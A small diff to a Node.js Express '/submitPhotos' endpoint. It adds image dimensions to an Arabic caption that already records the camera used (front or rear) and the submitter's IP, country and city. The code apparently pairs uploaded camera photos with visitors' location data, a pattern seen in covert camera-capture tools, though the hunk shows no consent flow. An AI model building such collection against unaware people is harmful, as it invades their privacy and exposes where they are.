@@ -508,6 +508,7 @@ app.post('/submitPhotos', upload.array('images', 20), async (req, res) => {
         const caption = `
 معلومات إضافية:
 نوع الكاميرا: ${cameraType === 'front' ? 'أمامية' : 'خلفية'}
+أبعاد الصورة: ${req.body.imageWidth}x${req.body.imageHeight}
 IP: ${additionalData.ip}
 الدولة: ${additionalData.country}
 المدينة: ${additionalData.city}
